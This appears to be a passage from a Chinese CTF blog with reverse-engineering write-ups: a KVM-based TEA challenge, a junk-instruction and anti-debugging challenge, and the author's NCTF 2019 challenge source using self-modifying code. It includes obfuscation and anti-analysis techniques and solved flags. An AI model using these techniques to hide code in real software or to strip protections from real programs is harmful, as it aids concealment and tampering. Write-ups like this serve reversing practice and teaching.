<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xl">第一步，获取到kvm句柄<br>kvmfd = open(<span class="hljs-string">&quot;/dev/kvm&quot;</span>, O_RDWR);<br>第二步，创建虚拟机，获取到虚拟机句柄。<br>vmfd = ioctl(kvmfd, KVM_CREATE_VM, <span class="hljs-number">0</span>);<br>第三步，为虚拟机映射内存，还有其他的PCI，信号处理的初始化。<br>ioctl(kvmfd, KVM_SET_USER_MEMORY_REGION, &amp;mem);<br>第四步，将虚拟机镜像映射到内存，相当于物理机的boot过程，把镜像映射到内存。<br>第五步，创建vCPU，并为vCPU分配内存空间。<br>ioctl(kvmfd, KVM_CREATE_VCPU, vcpuid);<br><span class="hljs-function"><span class="hljs-title">vcpu</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">kvm_run_mmap_size</span> = ioctl(kvm-&gt;</span>dev_fd, KVM_GET_VCPU_MMAP_SIZE, <span class="hljs-number">0</span>);<br>第五步，创建vCPU个数的线程并运行虚拟机。<br><span class="hljs-function"><span class="hljs-title">ioctl</span>(kvm-&gt;</span><span class="hljs-function"><span class="hljs-title">vcpus</span>-&gt;</span>vcpu_fd, KVM_RUN, <span class="hljs-number">0</span>);<br>第六步，线程进入循环，并捕获虚拟机退出原因，做相应的处理。<br>这里的退出并不一定是虚拟机关机，虚拟机如果遇到IO操作，访问硬件设备，缺页中断等都会退出执行，退出执行可以理解为将CPU执行上下文返回到QEMU。<br></code></pre></td></tr></table></figure>
<p>创建kvm句柄-&gt;创建vm-&gt;分配内存-&gt;加载镜像到内存-&gt;启动线程执行KVM_RUN.<br>所以一般都是看拷贝的机器码来分析<br>hlt代表退出<br>这题可以看出是个tea<br>//我傻了没有运行。。。发现就是写好解密函数<br>调用号自己改就行</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs smali">__int64 __fastcall sub_55C5F338615B(unsigned<span class="hljs-built_in"> int </span>*a1,<span class="hljs-built_in"> int </span>a2, __int64 a3)<br>&#123;<br>  unsigned<span class="hljs-built_in"> int </span>*v3; // rax<br>  unsigned<span class="hljs-built_in"> int </span>*v4; // rax<br>  __int64 result; // rax<br>  unsigned<span class="hljs-built_in"> int </span>*v6; // rax<br> <span class="hljs-built_in"> int </span>v7; // [rsp+Ch] [rbp-2Ch]<br> <span class="hljs-built_in"> int </span>v8; // [rsp+20h] [rbp-18h]<br>  unsigned<span class="hljs-built_in"> int </span>v9; // [rsp+20h] [rbp-18h]<br> <span class="hljs-built_in"> int </span>v10; // [rsp+24h] [rbp-14h]<br> <span class="hljs-built_in"> int </span>v11; // [rsp+24h] [rbp-14h]<br>  unsigned<span class="hljs-built_in"> int </span>j; // [rsp+28h] [rbp-10h]<br> <span class="hljs-built_in"> int </span>i; // [rsp+28h] [rbp-10h]<br>  unsigned<span class="hljs-built_in"> int </span>v14; // [rsp+2Ch] [rbp-Ch]<br>  unsigned<span class="hljs-built_in"> int </span>v15; // [rsp+2Ch] [rbp-Ch]<br>  unsigned<span class="hljs-built_in"> int </span>v16; // [rsp+30h] [rbp-8h]<br>  unsigned<span class="hljs-built_in"> int </span>v17; // [rsp+30h] [rbp-8h]<br>  unsigned<span class="hljs-built_in"> int </span>v18; // [rsp+30h] [rbp-8h]<br>  unsigned<span class="hljs-built_in"> int </span>v19; // [rsp+34h] [rbp-4h]<br>  unsigned<span class="hljs-built_in"> int </span>v20; // [rsp+34h] [rbp-4h]<br><br> <span class="hljs-built_in"> if </span>( a2 )<br>  &#123;<br>   <span class="hljs-built_in"> if </span>( a2 &lt;= 1 )<br>    &#123;<br>     <span class="hljs-built_in"> if </span>( a2 &lt; -1 )<br>      &#123;<br>        v7 = -a2;<br>        v11 = 52 / -a2 + 6;<br>        v15 = -1640531527 * v11;<br>        v20 = *a1;<br>        do<br>        &#123;<br>          v9 = (v15 &gt;&gt; 2) &amp; 3;<br>          for ( i = v7 - 1; i; --i )<br>          &#123;<br>            v17 = a1[i - 1];<br>            v6 = &amp;a1[i];<br>            *v6 -= ((v20 ^ v15) + (v17 ^ *(_DWORD *)(4LL * (v9 ^ i &amp; 3) + a3))) ^ (((4 * v20) ^ (v17 &gt;&gt; 5))<br>                                                                                 + ((v20 &gt;&gt; 3) ^ (16 * v17)));<br>            v20 = *v6;<br>          &#125;<br>          v18 = a1[v7 - 1];<br>          *a1 -= (((4 * v20) ^ (v18 &gt;&gt; 5)) + ((v20 &gt;&gt; 3) ^ (16 * v18))) ^ ((v20 ^ v15)<br>                                                                         + (v18 ^ *(_DWORD *)(4<span class="hljs-class">LL * v9 + a3)));</span><br>          result = *a1;<br>          v20 = *a1;<br>          v15 += 1640531527;<br>          --v11;<br>        &#125;<br>        while ( v11 );<br>      &#125;<br>    &#125;<br>    else<br>    &#123;<br>      v10 = 52 / a2 + 6;<br>      v14 = 0;<br>      v16 = a1[a2 - 1];<br>      do<br>      &#123;<br>        v14 -= 1640531527;<br>        v8 = (v14 &gt;&gt; 2) &amp; 3;<br>        for ( j = 0; j &lt; a2 - 1; ++j )<br>        &#123;<br>          v19 = a1[j + 1];<br>          v3 = &amp;a1[j];<br>          *v3 += ((v19 ^ v14) + (v16 ^ *(_DWORD *)(4LL * (v8 ^ j &amp; 3) + a3))) ^ (((4 * v19) ^ (v16 &gt;&gt; 5))<br>                                                                               + ((v19 &gt;&gt; 3) ^ (16 * v16)));<br>          v16 = *v3;<br>        &#125;<br>        v4 = &amp;a1[a2 - 1];<br>        *v4 += ((*a1 ^ v14) + (v16 ^ *(_DWORD *)(4LL * (v8 ^ j &amp; 3) + a3))) ^ (((4 * *a1) ^ (v16 &gt;&gt; 5))<br>                                                                             + ((*a1 &gt;&gt; 3) ^ (16 * v16)));<br>        result = *v4;<br>        v16 = result;<br>        --v10;<br>      &#125;<br>      while ( v10 );<br>    &#125;<br>  &#125;<br> <span class="hljs-built_in"> return </span>result;<br>&#125;<br>int main()<br>&#123;<br>    unsigned char key[] = &#123;0xEF, 0xBE, 0xAD, 0xDE, 0x21, 0x43, 0xEE, 0x12, 0x66, 0xC6,<br>  0x12, 0xBE, 0xBC, 0x3A, 0x12, 0x86&#125;;<br>  unsigned char flag[] = &#123;0xA9, 0x0B, 0xFC, 0x5D, 0xAA, 0xD9, 0xB6, 0xEC, 0x27, 0x8C,<br>  0x32, 0xB9, 0x0B, 0xF0, 0xAF, 0x6E, 0xF9, 0x44, 0x32, 0xE2,<br>  0x33, 0xB8, 0x1B, 0x6C, 0xA1, 0xD5, 0x9C, 0x8C, 0x0B, 0x60,<br>  0x57, 0x44, 0xEA, 0x65, 0xF5, 0xB1, 0x69, 0x0F, 0x8F, 0x9C,<br>  0x26, 0x64, 0x04, 0x10, 0x67, 0xD6, 0xB9, 0xA4, 0x3F, 0xB1,<br>  0x7A, 0x40, 0x16, 0x86, 0xC0, 0xB7&#125;;<br>  unsigned char temp[56];<br><br> <span class="hljs-built_in"> int </span>i,j,k;<br>  for(i=0;i&lt;56;i++)<br>  &#123;<br>      for(k=0;k&lt;56;k++)<br>        temp[k]=flag[k];<br>      sub_55C5F338615B(temp,-i,key);<br>      for(j=0;j&lt;56;j++)<br>      &#123;<br>          printf(<span class="hljs-string">&quot;%c&quot;</span>,temp[j]);<br>      &#125;<br>      printf(<span class="hljs-string">&quot;\n&quot;</span>);<br>  &#125;<br> <span class="hljs-built_in"> return </span>0;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>直接爆破<br>flag{KVM_i3_4_b4sic_linux_c0mp0n3nt_k3rn3l_supp0rt_vm}<br>过几天再写写xnuca的<br>当时没写出来</p>
<h1 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h1><p>有一说一，感觉这比赛质量不太行<br>俩到re<br>一道二血<br>还有一道和roar的tank一模一样的套路<br>我都佛了<br>说一下第一道吧</p>
<h2 id="flodbg"><a href="#flodbg" class="headerlink" title="flodbg"></a>flodbg</h2><p>就是个花指令加反调试题<br>完全不存在加密算法。。。说实话也太简单了吧<br><img src="30.png" srcset="/img/loading.gif" lazyload alt="30"><br>time什么的反调试直接patch即可<br><img src="31.png" srcset="/img/loading.gif" lazyload alt="31"><br><img src="32.png" srcset="/img/loading.gif" lazyload alt="32"><br>花指令主要是像上面的俩种<br>很好去<br>然后调试就能猜出func3是个类似栅栏的函数<br>他不改变你输入的值只是单纯移了下位<br>那就简单了输入0123456789abcdefgh然后把对应位还原即可</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0123456789abcdefghi</span><br><span class="hljs-attribute">8f6c90e1dg237abh5i4</span><br><span class="hljs-attribute">S</span>@yRtfTl<span class="hljs-number">0</span>+ag-L_<span class="hljs-number">3</span>M&#125;&#123;<br><span class="hljs-attribute">flag</span>&#123;My-StL_R<span class="hljs-number">0</span>T@+<span class="hljs-number">3</span>&#125;<br></code></pre></td></tr></table></figure>
<h1 id="NCTF-2019出题记录"><a href="#NCTF-2019出题记录" class="headerlink" title="NCTF 2019出题记录"></a>NCTF 2019出题记录</h1><h2 id="难看的代码"><a href="#难看的代码" class="headerlink" title="难看的代码"></a>难看的代码</h2><p>源码奉上</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a,<span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> key)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hua</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">smc</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span>* v, <span class="hljs-keyword">uint32_t</span>* k)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">desmc</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span>* v, <span class="hljs-keyword">uint32_t</span>* k)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fuck</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a)</span></span>;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> check[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">193</span>,<span class="hljs-number">38</span>,<span class="hljs-number">158</span>,<span class="hljs-number">255</span>,<span class="hljs-number">110</span>&#125;;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> fc[<span class="hljs-number">24</span>] = &#123;<span class="hljs-number">161</span>,<span class="hljs-number">209</span>,<span class="hljs-number">117</span>,<span class="hljs-number">242</span>,<span class="hljs-number">66</span>,<span class="hljs-number">208</span>,<span class="hljs-number">136</span>,<span class="hljs-number">126</span>,<span class="hljs-number">6</span>,<span class="hljs-number">143</span>,<span class="hljs-number">245</span>,<span class="hljs-number">155</span>,<span class="hljs-number">133</span>,<span class="hljs-number">235</span>,<span class="hljs-number">152</span>,<span class="hljs-number">76</span>,<span class="hljs-number">164</span>,<span class="hljs-number">49</span>,<span class="hljs-number">114</span>,<span class="hljs-number">212</span>,<span class="hljs-number">212</span>,<span class="hljs-number">101</span>,<span class="hljs-number">23</span>,<span class="hljs-number">234</span>&#125;;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> key[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x12345678</span>,<span class="hljs-number">0xbadf00d</span>,<span class="hljs-number">0x5201314</span>,<span class="hljs-number">0x87654321</span>&#125;;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> exit_0[] = &#123;<span class="hljs-number">0xC7</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x0C</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>&#125;;<span class="hljs-comment">//exit_code</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> flag[<span class="hljs-number">100</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;plz input the flag:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%99s&quot;</span>,&amp;flag);<br>    __asm__ __volatile__(<br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;jz lable1;&quot;</span><br>            <span class="hljs-string">&quot;call lable1;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable1:;&quot;</span><br>            );<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(flag)!=<span class="hljs-number">24</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;tcl&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    hua(flag);<br>    __asm__ __volatile__(<br>            <span class="hljs-string">&quot;jmp lable8;&quot;</span><br>            <span class="hljs-string">&quot;add eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable8:;&quot;</span><br>            );<br>    fuck(flag);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(flag);i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(flag[i] != fc[i])<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What a pity!!!&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you win!!!&quot;</span>);<br>    system(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fuck</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *flag)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>((flag[i]^<span class="hljs-number">8</span>) != check[i])<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;tcl&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(flag[<span class="hljs-built_in">strlen</span>(flag)<span class="hljs-number">-1</span>] != <span class="hljs-number">177</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;tcl&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(flag);i+=<span class="hljs-number">8</span>)<br>        smc(&amp;flag[i],key);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hua</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> temp1,temp2;<br>        __asm__ __volatile__(<br>            <span class="hljs-string">&quot;jmp lable3;&quot;</span><br>            <span class="hljs-string">&quot;add eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable3:;&quot;</span><br>            );<br>    double_smc(change,<span class="hljs-number">222</span>,<span class="hljs-number">0x12</span>);       <span class="hljs-comment">//double smc here</span><br>    <span class="hljs-comment">//change(smc,130,a[strlen(a)-1]);</span><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(a)/<span class="hljs-number">4</span>;i+=<span class="hljs-number">4</span>)<br>    &#123;<br>        a[i] += <span class="hljs-number">12</span>;<br>        a[i+<span class="hljs-number">1</span>] += <span class="hljs-number">34</span>;<br>        __asm__ __volatile__(<br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;jz lable2;&quot;</span><br>            <span class="hljs-string">&quot;call lable2;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable2:;&quot;</span><br>            );<br>        a[i+<span class="hljs-number">2</span>] += <span class="hljs-number">56</span>;<br>        a[i+<span class="hljs-number">3</span>] += <span class="hljs-number">78</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(a);i++)<br>    &#123;<br>        temp1 = a[i]&lt;&lt;<span class="hljs-number">3</span>;<br>        temp2 = a[i]&gt;&gt;<span class="hljs-number">5</span>;<br>        __asm__ __volatile__(<br>            <span class="hljs-string">&quot;jmp lable;&quot;</span><br>            <span class="hljs-string">&quot;add eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable:;&quot;</span><br>            );<br>        a[i] = temp1|temp2;<br>        a[i] ^= <span class="hljs-number">90</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">smc</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span>* v, <span class="hljs-keyword">uint32_t</span>* k)</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-keyword">uint32_t</span> v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0</span>, i;<br>    <span class="hljs-keyword">uint32_t</span> delta=<span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-keyword">uint32_t</span> k0=k[<span class="hljs-number">0</span>], k1=k[<span class="hljs-number">1</span>], k2=k[<span class="hljs-number">2</span>], k3=k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        sum += delta;<br>        v0 += ((v1&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="hljs-number">5</span>) + k1);<br>        v1 += ((v0&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="hljs-number">5</span>) + k3);<br>    &#125;<br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">double_smc</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *a,<span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> key)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> temp;<br>    DWORD dwOldFlag;<br>    __asm__ __volatile__(<br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;jz lable6;&quot;</span><br>            <span class="hljs-string">&quot;call lable2;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable6:;&quot;</span><br>            );<br>    <span class="hljs-keyword">if</span>(!VirtualProtect(a,<span class="hljs-built_in">size</span>,PAGE_READWRITE,&amp;dwOldFlag))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">size</span>;i++)<br>        &#123;<br>            *(a+i) ^= key;<br>        &#125;<br>        __asm__ __volatile__(<br>            <span class="hljs-string">&quot;jmp lable7;&quot;</span><br>            <span class="hljs-string">&quot;add eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;xor eax,eax;&quot;</span><br>            <span class="hljs-string">&quot;push 0x5201314;&quot;</span><br>            <span class="hljs-string">&quot;lable7:;&quot;</span><br>            );<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span 